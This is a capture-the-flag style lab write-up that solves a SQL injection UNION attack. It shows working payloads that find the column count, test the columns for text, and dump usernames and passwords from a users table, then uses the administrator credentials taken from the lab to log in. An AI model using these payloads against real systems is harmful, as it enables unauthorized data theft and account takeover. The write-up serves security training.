# Lab 05: SQL injection UNION attack, retrieving data from other tables

**Goal**: Perform a SQL injection UNION attack that retrieves all usernames and passwords from the `users` table, and use the credentials to log in as the `administrator` user.

---

## 🎯 Solution

1. Use Burp Suite to intercept and modify the category filter request.
2. Verify that the query returns two text columns using:
   ```sql
   '+UNION+SELECT+'abc','def'--
   ```
3. Use the following payload to extract credentials from `users`:
   ```sql
   '+UNION+SELECT+username,+password+FROM+users--
   ```
4. Extract the `administrator` password from the response and log in.

![Lab 5 Solution Summary](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801024859.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Find Column Count
Test using `ORDER BY`:
```http
/filter?category=Corporate+gifts'+ORDER+BY+1--
/filter?category=Corporate+gifts'+ORDER+BY+2--
/filter?category=Corporate+gifts'+ORDER+BY+3--
```

- **Order By 1**:
![Lab 5 Order By 1](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801024940.png)

- **Order By 2**:
![Lab 5 Order By 2](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025029.png)

- **Order By 3 Error**:
![Lab 5 Order By 3 Error](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025117.png)

> [!NOTE]
> Receiving an error at `ORDER BY 3` confirms **2 columns**.

### Step 2: Confirm Text Columns
Test both columns with text strings:
```http
/filter?category=Corporate+gifts'+UNION+SELECT+'a','a'--
```

![Lab 5 Confirm Text Columns](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025420.png)

Both columns accept text values! ✅

### Step 3: Extract User Credentials
Inject query to select `username` and `password` from `users`:
```http
/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--
```

![Lab 5 Dump Users Table](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025945.png)

#### Extracted Credentials:
| Username | Password |
|---|---|
| `administrator` | `p7humoseua6345awkvq2` |
| `carlos` | `8px41v2fri7ptdkgtsxp` |
| `wiener` | `n4w83bgt728e3ho0cezf` |

### Step 4: Login as Administrator
Go to `/login` and submit:
- **Username**: `administrator`
- **Password**: `p7humoseua6345awkvq2`

![Lab 5 Solved Admin Login](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Screenshot%202026-08-01%20031041.png)

> [!SUCCESS]
> **Lab Solved**: Successfully logged in as Administrator!